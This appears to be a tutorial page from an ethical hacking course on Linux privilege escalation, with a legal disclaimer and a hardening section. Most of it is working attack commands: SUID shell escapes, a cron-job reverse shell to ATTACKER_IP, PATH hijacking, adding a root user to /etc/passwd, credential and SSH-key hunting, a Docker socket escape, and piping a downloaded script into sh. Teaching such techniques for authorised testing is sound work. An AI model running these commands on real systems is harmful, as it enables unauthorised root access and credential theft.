# 🔐 Day 01 — Ethical Hacking on Linux: Recon & Privilege Escalation

> **⚠️ LEGAL DISCLAIMER:** This content is for **educational purposes only** and for use on systems you own or have **explicit written permission** to test. Unauthorized access to computer systems is illegal.

---

## Linux Privilege Escalation Checklist

When you land on a Linux box as a low-privilege user, this is your mental checklist:

---

## 1. System Enumeration

```bash
# OS version & kernel
uname -a
cat /etc/os-release
cat /proc/version

# Hostname & network
hostname -f
ip addr show
cat /etc/hosts

# Users & currently logged in
id                      # Who am I?
whoami
w                       # Who's logged in
last                    # Recent logins
cat /etc/passwd         # All users
cat /etc/group          # All groups

# Sudo permissions (HUGE)
sudo -l                 # What can I sudo?

# Environment
env
printenv PATH
```

---

## 2. SUID / SGID Binaries — Quick Win

```bash
# Find SUID files (run as owner regardless of executor)
find / -perm -4000 -type f 2>/dev/null

# Find SGID files
find / -perm -2000 -type f 2>/dev/null

# Find both
find / -perm /6000 -type f 2>/dev/null

# Common SUID escalation paths (check GTFOBins!)
/usr/bin/vim          # vim -c ':!/bin/sh'
/usr/bin/find         # find . -exec /bin/sh \; -quit
/usr/bin/python3      # python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
/usr/bin/cp           # cp /etc/shadow /tmp/
/usr/bin/nmap         # (older) nmap --interactive → !sh
```

> 💡 **GTFOBins:** https://gtfobins.github.io — catalog of Unix binaries that can be abused for priv esc.

---

## 3. Writable Files & Directories

```bash
# World-writable files (risky!)
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# World-writable directories
find / -writable -type d 2>/dev/null | grep -v proc

# Files owned by current user
find / -user $(whoami) -type f 2>/dev/null

# Check /etc/passwd writable (game over if so!)
ls -la /etc/passwd /etc/shadow /etc/sudoers

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
ls -la /var/spool/cron/crontabs/
```

---

## 4. Cronjob Exploitation

If a cron script is world-writable, or uses a binary in a writable PATH:

```bash
# Find cron jobs running as root
cat /etc/crontab
grep -r "" /etc/cron.d/ 2>/dev/null

# Check if the script is writable
ls -la /path/to/script.sh

# If writable — add a reverse shell
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /path/to/script.sh

# Listen on attacker machine
nc -lvnp 4444
```

---

## 5. PATH Hijacking

```bash
# Check sudo rules with NOPASSWD
sudo -l
# Example: (root) NOPASSWD: /opt/scripts/backup.sh

# If the script calls binaries without full path:
cat /opt/scripts/backup.sh
# #!/bin/bash
# tar czf /backup/data.tar.gz /data    ← uses 'tar' without full path!

# Create a malicious 'tar' in a directory you control
mkdir /tmp/privesc
echo '#!/bin/bash' > /tmp/privesc/tar
echo '/bin/bash -p' >> /tmp/privesc/tar
chmod +x /tmp/privesc/tar

# Prepend to PATH, run the sudo command
export PATH=/tmp/privesc:$PATH
sudo /opt/scripts/backup.sh   # Now runs your fake 'tar'!
```

---

## 6. Weak File Permissions on Sensitive Files

```bash
# /etc/shadow readable?
cat /etc/shadow 2>/dev/null

# /etc/passwd writable? Add a root user!
openssl passwd -1 -salt xyz "hacked"  # Generate password hash
echo "hax:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd

# Backup files with credentials
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
find / -name ".bash_history" 2>/dev/null -exec cat {} \;
find / -name "wp-config.php" 2>/dev/null
find / -name "*.env" 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

---

## 7. Linux Kernel Exploits

```bash
# Check kernel version
uname -r

# Famous kernel exploits (check applicability):
# Dirty COW (CVE-2016-5195): Linux 2.x - 4.8.3
# Dirty Pipe (CVE-2022-0847): Linux 5.8 - 5.16.11
# OverlayFS (CVE-2021-3493): Ubuntu specific

# Dirty Pipe exploit (overwrite read-only SUID)
# https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

# Check if system is vulnerable to Dirty COW
uname -r   # < 4.8.3
```

---

## 8. Docker Escape (if in a container)

```bash
# Am I in a container?
cat /proc/1/cgroup | grep docker
ls /.dockerenv
env | grep KUBERNETES

# Docker socket mounted?
ls -la /var/run/docker.sock
# If writable:
docker -H unix:///var/run/docker.sock run -it \
  -v /:/host alpine chroot /host /bin/bash

# Cap_sys_admin capability?
capsh --print | grep sys_admin
# Exploit: mount the host filesystem
```

---

## 9. Hardening Checklist (Blue Team)

```bash
# Audit SUID files
find / -perm -4000 -type f 2>/dev/null > /root/suid_baseline.txt

# Fail2ban (brute force protection)
apt install fail2ban
systemctl enable fail2ban

# Disable root SSH login
echo "PermitRootLogin no" >> /etc/ssh/sshd_config
echo "PasswordAuthentication no" >> /etc/ssh/sshd_config

# auditd — full system call auditing
apt install auditd
auditctl -w /etc/passwd -p wa -k passwd_changes
auditctl -w /etc/sudoers -p wa -k sudoers_changes
auditctl -a exit,always -F arch=b64 -S execve -k exec_commands

# Check listening services — minimize attack surface
ss -tlnp
systemctl list-units --type=service --state=running

# AppArmor / SELinux status
aa-status
getenforce

# Check for world-writable files
find / -perm -o+w -type f 2>/dev/null | grep -v proc | grep -v sys
```

---

## 10. Useful Security Tools

```bash
# LinPEAS — automated privilege escalation scanner
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Smart Enumeration
curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/main/lse.sh" -Lo lse.sh
chmod +x lse.sh && ./lse.sh

# Lynis — security audit tool
apt install lynis
lynis audit system

# chkrootkit — rootkit detector
apt install chkrootkit
chkrootkit

# rkhunter — rootkit hunter
apt install rkhunter
rkhunter --check
```

---

> ⚠️ **Always practice on legal platforms:**
> - [HackTheBox](https://hackthebox.com)
> - [TryHackMe](https://tryhackme.com)
> - [PentesterLab](https://pentesterlab.com)
> - [VulnHub](https://vulnhub.com)

---

> **Next:** [Day 02 — Network Recon & OSINT](./day02-network-recon.md)
